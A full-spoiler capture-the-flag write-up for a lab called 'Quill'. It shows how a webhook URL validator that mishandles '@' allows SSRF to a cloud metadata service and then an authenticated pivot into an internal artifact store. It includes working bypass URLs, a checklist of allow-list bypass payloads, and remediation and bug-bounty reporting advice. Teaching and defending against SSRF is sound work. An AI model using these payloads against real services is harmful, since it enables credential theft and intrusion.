# Solution — Quill

Full spoilers.

## Mapping the feature first

Sign in and open **Webhooks**. The form gives you three things worth
noting before you attack anything:

- a **destination URL**, checked against an allow-list
- an **HTTP method** (POST or GET)
- an arbitrary **custom header** name and value

and the delivery log prints the response body. That last part matters:
this is a *non-blind* SSRF, so you never need an out-of-band listener.

Point it at something internal and the app pushes back:

```
Destination "artifacts.internal" is not on the allow-list
(hooks.quill.io, webhooks.slack.com, events.pagerduty.com).
```

The control exists. So read how it is implemented.

## Objective 1 — `HxBugLabs{us3r1nf0_1s_b3f0r3_th3_4t_n0t_4ft3r}`

### The bug

Two different pieces of code decide what "the host" is.

The validator (`quill/server.js`) does its own string surgery:

```js
function hostFromUrl(raw) {
  const withoutScheme = String(raw).replace(/^[a-z][a-z0-9+.-]*:\/\//i, "");
  const authority = withoutScheme.split("/")[0].split("?")[0].split("#")[0];
  const withoutUserinfo = authority.split("@")[0];   // ← here
  return withoutUserinfo.split(":")[0].toLowerCase();
}
```

The delivery code uses the real parser:

```js
target = new URL(hook.url);
```

Line by line, `hostFromUrl` looks careful — it even strips the userinfo.
It strips it backwards. In `scheme://userinfo@host/path` the userinfo is
the part **before** the `@` and the host is the part **after**. Taking
`split("@")[0]` keeps the userinfo and throws the host away.

So for `http://hooks.quill.io@metadata.internal/`:

| | sees the host as |
| --- | --- |
| validator | `hooks.quill.io` → on the allow-list, approved |
| `new URL()` | `metadata.internal` → where the request actually goes |

### Exploiting it

Register a webhook with the method set to **GET** (the metadata service
answers GET, same as the real one — a POST gets you a 404):

```
URL:    http://hooks.quill.io@metadata.internal/latest/meta-data/
Method: GET
```

The delivery log comes back with the index:

```
ami-id
hostname
iam/
instance-id
placement/
```

Walk it exactly like you would on a real instance:

```
http://hooks.quill.io@metadata.internal/latest/meta-data/iam/security-credentials/
→ quill-webhook-dispatcher

http://hooks.quill.io@metadata.internal/latest/meta-data/iam/security-credentials/quill-webhook-dispatcher
```

```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA5EXAMPLE7QUILL42",
  "SecretAccessKey": "HxBugLabs{us3r1nf0_1s_b3f0r3_th3_4t_n0t_4ft3r}",
  "Token": "FwoGZXIvYXdzEBYaDJ-quill-dispatcher-session-token-v3",
  "Expiration": "2026-02-14T15:12:03Z",
  "Notes": "Grants read on artifacts.internal (bearer = Token above)."
}
```

### Root cause

**Parser differential.** One component validates, a different component
acts, and the two do not agree on what the string means. It does not
matter how strict the allow-list is if the thing it inspected is not the
thing that gets dialled.

The general rule, which is worth applying to every allow-list you meet:
**parse once, then pass the parsed object — never the original string —
to whatever performs the action.** Validate `url.hostname` and then fetch
`url`, not `raw`.

The userinfo trick is only the most common member of a family. When you
find a hand-rolled URL validator, the checklist is:

| Payload | Confuses |
| --- | --- |
| `http://allowed@internal/` | validators that keep the wrong side of `@` |
| `http://internal#@allowed/` | validators that split on `#` after `@` |
| `http://allowed\@internal/` | backslash-vs-slash normalisation differences |
| `http://internal:80@allowed/` | port-aware splitters |
| `http://[::ffff:169.254.169.254]/` | literal-IPv6 handling |
| `http://169.254.169.254.nip.io/` | suffix matching on a resolvable domain |
| `http://2852039166/` | decimal IP encoding |
| `http://allowed.evil.com/` | `endsWith` without a leading dot |
| a redirect from an allowed host | validators that check before following |

The last row deserves special attention on real targets: an allow-list
that only checks the *first* URL and then follows redirects is bypassed
by any open redirect on an allowed domain — and by any host you control
that is somehow on the list.

## Objective 2 — `HxBugLabs{ssrf_1s_0nly_4s_g00d_4s_th3_p1v0t}`

Credentials in a delivery log are a finding. Data is a severity. The role
document told you where they work: `artifacts.internal`, bearer token.

The webhook form lets you set one arbitrary header. That converts your
SSRF from "GET a URL" into "send a request I control the method, path and
authorization of".

```
URL:          http://hooks.quill.io@artifacts.internal/buckets
Method:       GET
Header name:  Authorization
Header value: Bearer FwoGZXIvYXdzEBYaDJ-quill-dispatcher-session-token-v3
```

```json
{ "buckets": ["quill-page-exports", "quill-db-snapshots", "quill-deploy-keys"] }
```

Without the header the same request gets `{"error":"role token required"}`,
which is how you demonstrate the credential is doing the work:

```
http://hooks.quill.io@artifacts.internal/buckets/quill-deploy-keys
```

```json
{
  "bucket": "quill-deploy-keys",
  "objects": [
    { "key": "ci/github-deploy.pem", "size": 1704 },
    { "key": "ci/rotation-token.txt",
      "preview": "HxBugLabs{ssrf_1s_0nly_4s_g00d_4s_th3_p1v0t}" }
  ]
}
```

### Root cause

Three failures compound, and each one is worth recognising separately:

1. **IMDSv1 semantics.** Any request originating from the instance gets
   credentials, with no proof the caller is the workload rather than a
   URL the workload was tricked into fetching. IMDSv2's session-token
   handshake (a `PUT` with `X-aws-ec2-metadata-token-ttl-seconds`, then
   the token on every `GET`) exists precisely because SSRF-to-metadata was
   the dominant cloud-credential-theft path. A hop limit of 1 also stops
   containers on a bridge network reaching it.
2. **Attacker-controlled request headers.** "Let the customer add a
   header for their own endpoint" is a reasonable feature until the
   destination is not their endpoint. The header capability is what turns
   a read primitive into an authenticated read primitive.
3. **Network-position-as-authorization.** `artifacts.internal` accepts
   any caller with a valid role token. No audience binding, no check of
   which principal presented it, no egress policy stopping the web tier
   from reaching the artifact store at all. This is why "it's on the
   internal network" is not a control.

### Reporting this on a real program

Chain it into one submission, and lead with the data. The template that
gets these triaged fast:

> Webhook destination validation can be bypassed with a userinfo-prefixed
> URL, causing the application to issue attacker-controlled requests from
> inside the VPC. I used this to read the instance role credentials from
> IMDSv1 and then, using the webhook's custom-header feature, to list and
> read objects in `artifacts.internal`, including `ci/rotation-token.txt`.
> No out-of-band infrastructure was needed — the delivery log returns the
> full response body.

Include the exact bypass string, the two screenshots (rejected internal
host, then accepted userinfo host), and **stop at proof**. Reading a
directory listing and one file preview is proof; dumping the bucket is
not, and on a real program it is how a valid Critical becomes a
conversation with someone's legal team. Note the credential you retrieved
by its key ID only, and say plainly in the report that it should be
rotated.
